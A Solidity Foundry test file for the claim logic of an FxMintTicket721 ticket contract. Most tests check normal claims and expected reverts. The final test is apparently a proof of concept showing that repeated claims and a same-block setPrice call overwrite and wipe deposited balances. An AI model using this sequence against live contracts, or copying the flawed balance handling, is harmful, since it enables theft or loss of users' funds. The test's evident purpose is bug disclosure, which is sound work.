// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "test/tokens/FxMintTicket721/FxMintTicket721Test.t.sol";

contract Claim is FxMintTicket721Test {
    function setUp() public virtual override {
        super.setUp();
        TicketLib.mint(alice, minter, fxMintTicketProxy, bob, amount, PRICE);
        TicketLib.deposit(bob, fxMintTicketProxy, tokenId, DEPOSIT_AMOUNT);
        _setTaxInfo();
    }

    function test_Claim_ListingPrice() public {
        vm.warp(gracePeriod + 1);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, newPrice, PRICE + DEPOSIT_AMOUNT);
        _setTaxInfo();
        assertEq(FxMintTicket721(fxMintTicketProxy).ownerOf(tokenId), alice);
        assertEq(foreclosureTime, block.timestamp + (ONE_DAY * 2));
        assertEq(currentPrice, newPrice);
        assertEq(depositAmount, DEPOSIT_AMOUNT);
    }

    function test_Claim_AuctionPrice() public {
        vm.warp(foreclosureTime + TEN_MINUTES);
        _setAuctionPrice();
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, newPrice, auctionPrice + DEPOSIT_AMOUNT);
        _setTaxInfo();
        assertEq(FxMintTicket721(fxMintTicketProxy).ownerOf(tokenId), alice);
        assertEq(foreclosureTime, block.timestamp + (ONE_DAY * 2));
        assertEq(currentPrice, newPrice);
        assertEq(depositAmount, DEPOSIT_AMOUNT);
    }

    function test_RevertsWhen_GracePeriodActive() public {
        vm.expectRevert(GRACE_PERIOD_ACTIVE_ERROR);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, newPrice, PRICE + DEPOSIT_AMOUNT);
    }

    function test_RevertsWhen_PriceExceeded() public {
        vm.warp(gracePeriod + 1);
        vm.expectRevert(PRICE_EXCEEDED_ERROR);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE - 1, newPrice, PRICE + DEPOSIT_AMOUNT);
    }

    function test_RevertsWhen_InvalidPrice() public {
        vm.warp(gracePeriod + 1);
        vm.expectRevert(INVALID_PRICE_ERROR);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, uint80(MINIMUM_PRICE - 1), PRICE + DEPOSIT_AMOUNT);
    }

    function test_RevertsWhen_InsufficientPayment() public {
        vm.warp(gracePeriod + 1);
        vm.expectRevert(INSUFFICIENT_PAYMENT_ERROR);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, newPrice, PRICE + (DEPOSIT_AMOUNT / 2) - 1);
    }

    function test_OverwritesBalance() public {
        (, bytes memory data) = fxMintTicketProxy.call(abi.encodeWithSignature("owner()"));
        address nftContractOwner = abi.decode(data, (address));
        uint256 grace = gracePeriod - block.timestamp;

        vm.warp(gracePeriod + 1);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId, PRICE, newPrice, PRICE + DEPOSIT_AMOUNT);
        console.log("Original balances after first claim...");
        console.log("fxMintTicket Eth balance: ", fxMintTicketProxy.balance);
        console.log("Bob Eth balance in fxMintTicket contract: ", IFxMintTicket721(fxMintTicketProxy).getBalance(bob));
        console.log(
            "Owner Eth balance in fxMintTicket contract: ",
            IFxMintTicket721(fxMintTicketProxy).getBalance(nftContractOwner)
        );

        // Showing that this will overwrite both of their balances. Bob's balance will be lower than originally set AND he will not have
        // been able to withdraw his original balance
        TicketLib.mint(alice, minter, fxMintTicketProxy, bob, amount, PRICE);
        TicketLib.deposit(bob, fxMintTicketProxy, tokenId + 1, DEPOSIT_AMOUNT);
        vm.warp(gracePeriod + grace * 2);
        console.log("\nCalling claim again for bob...");
        TicketLib.claim(alice, fxMintTicketProxy, tokenId + 1, PRICE, newPrice, PRICE + DEPOSIT_AMOUNT);
        console.log("fxMintTicket Eth balance: ", fxMintTicketProxy.balance);
        console.log("Bob Eth balance in fxMintTicket contract: ", IFxMintTicket721(fxMintTicketProxy).getBalance(bob));
        console.log(
            "Owner Eth balance in fxMintTicket contract: ",
            IFxMintTicket721(fxMintTicketProxy).getBalance(nftContractOwner)
        );

        // This time we are just going to claim on a foreclosed ticket just to show impact as this will make the
        // Owner's balance high
        TicketLib.mint(alice, minter, fxMintTicketProxy, bob, amount, PRICE);
        TicketLib.deposit(bob, fxMintTicketProxy, tokenId + 2, DEPOSIT_AMOUNT);
        vm.warp(gracePeriod * 3);
        TicketLib.claim(alice, fxMintTicketProxy, tokenId + 2, PRICE, newPrice, PRICE + DEPOSIT_AMOUNT);

        // Here we mint a ticket that will in the same transaction be used to set the owner's balance to 0
        TicketLib.mint(alice, minter, fxMintTicketProxy, bob, amount, PRICE);
        TicketLib.deposit(bob, fxMintTicketProxy, tokenId + 3, DEPOSIT_AMOUNT);

        console.log("\nGetting owners balance high due to foreclosed claim...");
        console.log("fxMintTicket Eth balance: ", fxMintTicketProxy.balance);
        console.log("Bob Eth balance in fxMintTicket contract: ", IFxMintTicket721(fxMintTicketProxy).getBalance(bob));
        console.log(
            "Owner Eth balance in fxMintTicket contract: ",
            IFxMintTicket721(fxMintTicketProxy).getBalance(nftContractOwner)
        );

        // calling setPrice within the same block will set the owner's balance to 0
        vm.startPrank(bob);
        IFxMintTicket721(fxMintTicketProxy).setPrice(4, uint80(PRICE));
        vm.stopPrank();

        console.log("\nAfter calling setPrice, owners balance will be wiped out...");
        console.log("fxMintTicket Eth balance: ", fxMintTicketProxy.balance);
        console.log("Bob Eth balance in fxMintTicket contract: ", IFxMintTicket721(fxMintTicketProxy).getBalance(bob));
        console.log(
            "Owner Eth balance in fxMintTicket contract: ",
            IFxMintTicket721(fxMintTicketProxy).getBalance(nftContractOwner)
        );
    }
}
